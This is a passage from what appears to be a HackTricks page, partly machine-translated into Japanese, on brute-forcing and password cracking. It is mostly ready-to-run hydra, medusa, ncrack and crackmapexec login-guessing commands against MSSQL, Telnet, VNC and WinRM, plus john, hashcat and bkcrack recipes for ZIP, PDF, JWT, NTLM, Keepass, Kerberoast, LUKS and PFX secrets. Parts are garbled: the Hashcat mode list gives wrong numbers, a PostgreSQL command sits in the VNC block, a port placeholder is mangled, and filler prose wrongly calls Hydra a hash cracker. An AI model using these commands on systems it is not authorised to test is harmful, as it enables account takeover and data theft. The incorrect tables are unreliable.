一部のシステムでは、暗号化素材を生成するために使用されるランダムシードに既知の欠陥があります。これにより、キースペースが劇的に減少し、[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)などのツールでブルートフォース攻撃が可能になります。また、[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)のような弱いキーの事前生成セットも利用可能です。

### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### Telnet

Telnetは、ネットワーク上でリモートコンピュータに接続するためのプロトコルです。通常、ユーザー名とパスワードを使用して認証を行い、リモートコンピュータにログインすることができます。

Telnetは、ネットワーク上のサービスやデバイスに対してコマンドを送信するために使用されることがあります。しかし、Telnetはセキュリティ上の脆弱性があるため、暗号化されたSSHプロトコルに置き換えられることが一般的です。

ハッカーは、Telnetサービスに対してブルートフォース攻撃を行うことがあります。ブルートフォース攻撃では、ハッカーはさまざまなユーザー名とパスワードの組み合わせを試し、正しい認証情報を見つけ出すことを試みます。

ブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、アカウントロックアウト機能を有効にすることが重要です。また、Telnetサービスを使用する代わりに、より安全なSSHプロトコルを使用することをお勧めします。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

VNC（Virtual Network Computing）は、リモートデスクトッププロトコル（RDP）の一種であり、リモートマシンへのアクセスを提供します。VNCは、クライアントとサーバーの間でデスクトップ画面を共有するために使用されます。

VNCのブルートフォース攻撃は、パスワードの推測を行い、正しいパスワードを見つけることを試みます。ブルートフォース攻撃は、一般的なパスワードや辞書攻撃を使用して実行されることがあります。

以下は、VNCのブルートフォース攻撃の手順です。

1. ブルートフォース攻撃ツールを使用して、VNCサーバーに接続します。
2. ユーザー名とパスワードのリストを作成します。一般的なパスワードや辞書攻撃に使用することができます。
3. ブルートフォース攻撃ツールを設定し、ユーザー名とパスワードのリストを使用して攻撃を開始します。
4. ブルートフォース攻撃ツールは、ユーザー名とパスワードの組み合わせを試し、正しい組み合わせを見つけるまで続けます。
5. 正しいユーザー名とパスワードの組み合わせが見つかると、攻撃者はVNCサーバーにアクセスできるようになります。

VNCのブルートフォース攻撃は、強力なパスワードポリシーが実装されていない場合に特に有効です。攻撃者は、短いパスワードや一般的なパスワードを使用しているユーザーを狙うことができます。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm（Windows Remote Management）は、Windowsシステムでリモート管理を可能にするためのプロトコルです。Winrmは、HTTPまたはHTTPSを介して通信し、PowerShellスクリプトやコマンドをリモートで実行することができます。

Winrmを使用してリモートシステムにアクセスするためには、以下の手順を実行する必要があります。

1. Winrmサービスを有効にする：`winrm quickconfig`コマンドを実行して、Winrmサービスを有効にします。

2. ファイアウォールの設定：Winrmポート（通常は5985または5986）をファイアウォールで開放する必要があります。

3. 認証の設定：Winrmを使用するためには、適切な認証設定が必要です。デフォルトでは、WinrmはNTLM認証を使用しますが、Kerberos認証やSSL証明書を使用することもできます。

Winrmを使用してリモートシステムにアクセスすると、様々なタスクを実行することができます。例えば、ファイルの転送、プロセスの実行、イベントログの監視などが可能です。

Winrmは、システム管理者やセキュリティテスターにとって非常に便利なツールですが、悪意のある攻撃者にとっても潜在的な脆弱性となり得ます。したがって、Winrmを使用する際には、適切なセキュリティ対策を講じることが重要です。
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
![](<../.gitbook/assets/image (9) (1) (2).png>)

[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフロー**を簡単に構築し、自動化することができます。
今すぐアクセスを取得してください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ローカル

### オンラインクラッキングデータベース

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (ハッシュ、WPA2キャプチャ、およびMSOffice、ZIP、PDFのアーカイブ)
* [https://crackstation.net/](https://crackstation.net) (ハッシュ)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (ハッシュとファイルハッシュ)
* [https://hashes.org/search.php](https://hashes.org/search.php) (ハッシュ)
* [https://www.cmd5.org/](https://www.cmd5.org) (ハッシュ)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5、NTLM、SHA1、MySQL5、SHA256、SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

ハッシュをブルートフォース攻撃する前に、これをチェックしてください。

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### 既知の平文zip攻撃

暗号化されたzip内のファイルの**平文**（または平文の一部）を知る必要があります。暗号化されたzip内のファイルの**ファイル名とサイズを確認する**には、**`7z l encrypted.zip`**を実行します。\
[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)をリリースページからダウンロードしてください。
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

7zは、高い圧縮率を持つオープンソースのファイルアーカイバです。7zファイルは、他のファイルアーカイブ形式よりも小さくなる傾向があります。7zは、パスワードで保護されたファイルを作成することもできます。

#### 7zのブルートフォース攻撃

7zファイルのパスワードを解読するために、ブルートフォース攻撃を使用することができます。ブルートフォース攻撃は、すべての可能なパスワードの組み合わせを試すことで、正しいパスワードを見つける手法です。

以下は、7zファイルのブルートフォース攻撃を実行するための手順です。

1. ブルートフォース攻撃ツールを使用して、7zファイルのパスワードを解読します。一般的なツールには、John the RipperやHashcatなどがあります。

2. ブルートフォース攻撃ツールに、パスワードの辞書ファイルを指定します。辞書ファイルには、一般的なパスワードやキーワードのリストが含まれています。

3. ブルートフォース攻撃ツールに、7zファイルのパスワードを解読するためのルールを指定します。ルールには、パスワードの長さや使用できる文字の種類などが含まれます。

4. ブルートフォース攻撃ツールを実行し、すべての可能なパスワードの組み合わせを試します。攻撃が成功すると、正しいパスワードが見つかります。

ブルートフォース攻撃は、時間がかかる場合があります。パスワードの長さや複雑さによっては、解読に数時間以上かかることもあります。また、ブルートフォース攻撃は、合法的な目的でのみ使用することが重要です。
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

PDF（Portable Document Format）は、電子文書のフォーマットであり、さまざまなプラットフォームで利用されています。PDFファイルは、テキスト、画像、図表などの情報を保持し、異なるデバイスやソフトウェアで一貫した表示を提供します。

PDFファイルのブルートフォース攻撃は、パスワードの総当たり攻撃を行うことを意味します。これにより、パスワードが不明なPDFファイルにアクセスすることが可能になります。

ブルートフォース攻撃は、一般的に辞書攻撃やランダムな文字列の組み合わせを使用して行われます。攻撃者は、パスワードの長さや文字セットに基づいて、可能な組み合わせを試行し続けます。

PDFファイルのブルートフォース攻撃は、パスワードが強力である場合には非常に困難です。しかし、弱いパスワードや一般的な単語の使用など、セキュリティ上の脆弱性がある場合には成功する可能性があります。

ブルートフォース攻撃を防ぐためには、強力なパスワードを使用することが重要です。また、2要素認証やアカウントロックなどのセキュリティ対策も有効です。
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDFオーナーパスワード

PDFオーナーパスワードをクラックするには、次を参照してください：[https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM クラッキング

NTLM クラッキングは、Windows ベースのシステムで使用される NTLM ハッシュを解読するための攻撃手法です。NTLM ハッシュは、ユーザーのパスワードをハッシュ化したものであり、クラッカーがこれを解読することで、パスワードを取得することができます。

NTLM クラッキングには、以下のような手法があります。

1. 辞書攻撃: 事前に作成された辞書ファイルを使用して、一連のパスワード候補を試す方法です。クラッカーは、一致するハッシュを見つけるまで、辞書ファイル内のすべての単語やフレーズを試します。

2. ブルートフォース攻撃: すべての可能な組み合わせを試す方法です。クラッカーは、パスワードの長さや文字セットに基づいて、すべての組み合わせを順番に試します。この方法は非常に時間がかかる場合があります。

3. ハイブリッド攻撃: 辞書攻撃とブルートフォース攻撃を組み合わせた方法です。まず、辞書攻撃を試し、一致するハッシュが見つからない場合には、ブルートフォース攻撃に移行します。

NTLM クラッキングは、強力なパスワードポリシーが実装されていない場合や、弱いパスワードが使用されている場合に特に有効です。クラッカーは、高速なハッシュ関数や GPU を使用することで、クラッキングの効率を向上させることができます。

NTLM クラッキングに対する防御策としては、強力なパスワードポリシーの実装、多要素認証の使用、ハッシュのソルト化などがあります。これらの対策を講じることで、NTLM クラッキングのリスクを軽減することができます。
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
# Keepass

Keepassは、パスワード管理ツールであり、パスワードの保存、生成、自動入力をサポートします。Keepassは、強力な暗号化アルゴリズムを使用してパスワードデータベースを保護し、マスターパスワードを使用してアクセスを制御します。

Keepassのブルートフォース攻撃は、マスターパスワードを特定するために使用されます。ブルートフォース攻撃は、すべての可能な組み合わせを試し、正しいパスワードを見つけるまで続けます。

Keepassのブルートフォース攻撃を実行するためには、次の手順を実行する必要があります。

1. ブルートフォース攻撃ツールを使用して、Keepassデータベースファイルを解析します。
2. ブルートフォース攻撃ツールを使用して、マスターパスワードを特定します。
3. ブルートフォース攻撃ツールを使用して、マスターパスワードを試行します。
4. 正しいマスターパスワードが見つかるまで、ブルートフォース攻撃を続けます。

ブルートフォース攻撃は非常に時間がかかる場合があります。パスワードの長さや複雑さによっては、数日または数週間かかることもあります。また、ブルートフォース攻撃は、Keepassデータベースが強力なパスワードで保護されている場合にのみ有効です。強力なパスワードを使用することで、ブルートフォース攻撃を困難にすることができます。

Keepassのブルートフォース攻撃は、合法的な目的のためにのみ使用されるべきです。不正な目的で使用することは違法です。
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoastingは、Active Directory（AD）環境で使用されるサービスアカウントのパスワードをクラックするための攻撃手法です。この攻撃は、Kerberos認証プロトコルの脆弱性を利用しています。

攻撃者は、AD環境内のサービスアカウントのユーザー名を特定し、そのユーザー名を使用してKerberosチケットを要求します。次に、攻撃者は取得したチケットをオフラインで解析し、サービスアカウントのパスワードをクラックします。

Keberoastingは、サービスアカウントがパスワードをハッシュ形式で保存しているために可能となります。攻撃者は、サービスアカウントのハッシュを取得し、オフラインでブルートフォース攻撃を行うことでパスワードを特定します。

この攻撃手法は、一般的にはドメイン内のサービスアカウントのパスワードをクラックするために使用されます。攻撃者は、クラックしたパスワードを使用して特権のあるアクセス権を取得し、システム内での横断移動や特権昇格などの攻撃を行うことができます。

Keberoasting攻撃を防ぐためには、サービスアカウントのパスワードを強力なものに設定し、定期的に変更することが重要です。また、サービスアカウントのハッシュを保護するために、適切なアクセス制御と監視を実施することも必要です。
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### LUKSイメージ

#### 方法1

インストール: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### 方法2

Brute force is a common method used to crack passwords or gain unauthorized access to systems. It involves systematically trying all possible combinations of characters until the correct password is found. This method can be time-consuming and resource-intensive, but it can be effective if the password is weak or easily guessable.

There are several tools available for performing brute force attacks, such as Hydra, Medusa, and John the Ripper. These tools allow you to specify the target system, the username, and the password list to use for the attack.

When performing a brute force attack, it is important to use a good password list that includes common passwords, dictionary words, and variations of the target's personal information. It is also recommended to use a tool that supports multi-threading, as this can significantly speed up the attack.

It is worth noting that brute force attacks are not always successful, especially if the target system has implemented security measures such as account lockouts or CAPTCHA. Additionally, brute force attacks can be detected by intrusion detection systems, so it is important to use caution and discretion when performing this type of attack.

Overall, brute force attacks can be a powerful tool in a hacker's arsenal, but they should be used responsibly and ethically. It is important to obtain proper authorization before attempting any brute force attack and to ensure that the target system is owned or controlled by the person or organization requesting the attack.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
別のLuks BFチュートリアル：[http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPGの秘密鍵

```html
PGP/GPGの秘密鍵は、暗号化とデジタル署名に使用される重要な要素です。秘密鍵は、公開鍵と対になっており、データの暗号化や署名の作成に使用されます。

秘密鍵を保護することは非常に重要であり、漏洩すると重大なセキュリティリスクにつながります。秘密鍵を保護するためには、以下のベストプラクティスを守ることが必要です。

- 秘密鍵を安全な場所に保存する。物理的なアクセスが制限された場所や暗号化されたデバイスに保存することが推奨されます。
- パスフレーズを使用して秘密鍵を保護する。強力なパスフレーズを設定し、定期的に変更することが重要です。
- 秘密鍵を必要な場合にのみ使用する。秘密鍵を不必要に公開しないようにし、必要な場合にのみ使用するようにします。

秘密鍵の漏洩を防ぐためには、セキュリティ意識の高い行動が必要です。定期的なセキュリティ監査や脆弱性スキャンを実施し、セキュリティ対策を強化することが重要です。
```
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)を使用して、次にjohnを使用します。

### Open Office Pwd Protected Column

パスワードで保護された列を持つxlsxファイルがある場合、次の手順で保護を解除できます：

* **Googleドライブにアップロード**すると、パスワードが自動的に削除されます
* **手動で**それを**削除**するには：
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX証明書

PFX証明書は、Microsoft Windowsで一般的に使用される証明書形式です。PFXは、証明書とその関連する秘密鍵を1つのファイルに結合するため、便利な形式として知られています。PFX証明書は、デジタル署名や暗号化などのセキュリティ関連の操作に使用されます。

PFX証明書をブルートフォース攻撃する場合、以下の手順を実行します。

1. 辞書攻撃: 一般的なパスワードや一般的な単語のリストを使用して、PFX証明書のパスワードを推測します。
2. ブルートフォース攻撃: 辞書攻撃が成功しなかった場合、すべての可能な組み合わせを試すために、パスワードのすべての組み合わせを総当たりで試します。これは非常に時間がかかる場合があります。

ブルートフォース攻撃は、パスワードの強度が弱い場合に効果的です。しかし、強力なパスワードを使用している場合は、ブルートフォース攻撃は非現実的な時間がかかる可能性があります。
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
![](<../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ツール

**ハッシュの例：** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### ハッシュ識別子
```bash
hash-identifier
> <HASH>
```
### ワードリスト

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **ワードリスト生成ツール**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 設定可能なベース文字、キーマップ、ルートを持つ高度なキーボードウォークジェネレーター。
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Johnの変異

_**/etc/john/john.conf**_を読み、それを設定します。
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat攻撃

* **ワードリスト攻撃** (`-a 0`) with ルール

**Hashcat**はすでに**ルールを含むフォルダ**を持っていますが、[**ここで他の興味深いルールを見つけることができます**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **ワードリスト組み合わせ**攻撃

hashcatを使用して、2つのワードリストを1つに組み合わせることができます。\
もし、リスト1に単語**"hello"**が含まれており、2つ目のリストには単語**"world"**と**"earth"**が2行含まれている場合、`helloworld`と`helloearth`という単語が生成されます。
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **マスク攻撃** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* ワードリスト + マスク (`-a 6`) / マスク + ワードリスト (`-a 7`) 攻撃
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcatモード

Hashcatは、さまざまなハッシュ関数をクラックするためのさまざまなモードを提供しています。以下に、一部の一般的なモードを示します。

- **0**: Straightモード。ハッシュを直接クラックします。
- **100**: DCCモード。DCC（Distributed Checksum Clearinghouse）ハッシュをクラックします。
- **1400**: WPA/WPA2ハンドシェイクモード。WPA/WPA2ハンドシェイクをクラックします。
- **1700**: Kerberos 5 TGS-REP etype 23モード。Kerberos 5 TGS-REP etype 23ハッシュをクラックします。
- **2500**: WPA/WPA2ハンドシェイクモード（PMKID）。WPA/WPA2ハンドシェイクのPMKIDをクラックします。
- **3000**: LMハッシュモード。LMハッシュをクラックします。
- **5000**: MD5ハッシュモード。MD5ハッシュをクラックします。
- **5600**: NetNTLMv1ハッシュモード。NetNTLMv1ハッシュをクラックします。
- **10000**: NTLMハッシュモード。NTLMハッシュをクラックします。
- **16800**: SHA-512ハッシュモード。SHA-512ハッシュをクラックします。

これらは、Hashcatがサポートするモードの一部です。ハッシュの種類に応じて、適切なモードを選択することが重要です。
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Cracking Linux Hashes - /etc/shadow file

## Introduction

In Linux systems, user passwords are stored in the `/etc/shadow` file. This file contains hashed passwords, which are one-way encrypted representations of the original passwords. As a hacker, if you gain access to the `/etc/shadow` file, you can attempt to crack these hashes and obtain the original passwords.

## Brute-Force Attack

One common method to crack Linux hashes is through a brute-force attack. In this attack, the hacker systematically tries all possible combinations of characters until the correct password is found. This can be a time-consuming process, especially for complex passwords.

## Dictionary Attack

Another approach is the dictionary attack, where the hacker uses a pre-generated list of commonly used passwords or words from a dictionary. The attacker compares each word's hash with the hashes in the `/etc/shadow` file, hoping to find a match. This method is faster than brute-force, but it relies on the user choosing a weak or common password.

## Rainbow Tables

Rainbow tables are precomputed tables of hashes and their corresponding plaintext passwords. These tables can be used to quickly find the original password for a given hash. However, rainbow tables can be large in size and require significant storage space.

## Online Hash Cracking Services

There are online services available that offer hash cracking capabilities. These services utilize powerful hardware and algorithms to crack hashes quickly. However, using these services may raise ethical and legal concerns, so caution should be exercised.

## Conclusion

Cracking Linux hashes from the `/etc/shadow` file can be a challenging task. It requires knowledge of various cracking techniques and tools. As a hacker, it is important to understand the risks and legal implications associated with hash cracking activities.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Cracking Windows Hashes

## Introduction

In this section, we will discuss the process of cracking Windows hashes. Windows hashes are cryptographic representations of user passwords stored in the Windows operating system. By cracking these hashes, we can obtain the original plaintext passwords, which can be useful for various purposes, such as gaining unauthorized access to user accounts.

## Methodologies

There are several methodologies and tools available for cracking Windows hashes. Here, we will discuss two commonly used methods: brute-forcing and dictionary attacks.

### Brute-Force Attacks

Brute-force attacks involve systematically trying every possible combination of characters until the correct password is found. This method is time-consuming and resource-intensive, as it requires trying a large number of combinations. However, it can be effective if the password is weak and easily guessable.

To perform a brute-force attack on Windows hashes, we can use tools like John the Ripper or Hashcat. These tools utilize powerful algorithms and techniques to speed up the cracking process.

### Dictionary Attacks

Dictionary attacks involve using a pre-generated list of commonly used passwords, known as a dictionary, to crack the hashes. This method is more efficient than brute-forcing, as it reduces the number of combinations to try. However, it relies on the assumption that the user has chosen a password from the dictionary.

To perform a dictionary attack on Windows hashes, we can use tools like Hashcat or Hydra. These tools allow us to specify a dictionary file and automate the cracking process.

## Resources

There are various resources available to aid in the cracking of Windows hashes. These include:

- Wordlists: These are collections of words, passwords, and common phrases that can be used in dictionary attacks.
- Rainbow tables: These are precomputed tables that map hashes to their corresponding plaintext passwords, making the cracking process faster.
- Online databases: Some websites provide databases of leaked passwords, which can be used to crack Windows hashes.

By utilizing these resources and employing the appropriate methodologies, we can increase our chances of successfully cracking Windows hashes and obtaining the original passwords. However, it is important to note that cracking Windows hashes without proper authorization is illegal and unethical.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Cracking Common Application Hashes

## Introduction

In this section, we will discuss the process of cracking common application hashes. Hash cracking is a technique used to recover plaintext passwords from their hashed representations. By cracking the hashes, we can gain unauthorized access to various applications and systems.

## Types of Hashes

There are several types of hashes commonly used in applications. Some of the most common ones include:

- **MD5**: This is a widely used hash function that produces a 128-bit hash value. It is commonly used in older applications and systems.
- **SHA-1**: This is another widely used hash function that produces a 160-bit hash value. It is also commonly used in older applications and systems.
- **SHA-256**: This is a more secure hash function that produces a 256-bit hash value. It is commonly used in modern applications and systems.

## Hash Cracking Techniques

There are various techniques that can be used to crack hashes. Some of the most common ones include:

- **Brute Force**: This technique involves trying all possible combinations of characters until the correct password is found. It is a time-consuming process but can be effective for cracking weak passwords.
- **Dictionary Attack**: This technique involves using a pre-generated list of commonly used passwords, known as a dictionary, to crack the hash. It is faster than brute force but may not be effective against complex passwords.
- **Rainbow Tables**: This technique involves using precomputed tables of hash values and their corresponding plaintext passwords to crack the hash. It is faster than brute force and dictionary attacks but requires a large amount of storage.

## Tools for Hash Cracking

There are several tools available for cracking hashes. Some of the most popular ones include:

- **John the Ripper**: This is a powerful password cracking tool that supports various hash types and cracking techniques.
- **Hashcat**: This is another popular password cracking tool that supports a wide range of hash types and cracking techniques.
- **Hydra**: This is a versatile online password cracking tool that supports various protocols and can be used for hash cracking.

## Conclusion

Cracking common application hashes is an essential skill for hackers and penetration testers. By understanding the different types of hashes, cracking techniques, and tools available, you can effectively gain unauthorized access to applications and systems. However, it is important to note that hash cracking should only be performed with proper authorization and for legitimate purposes.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
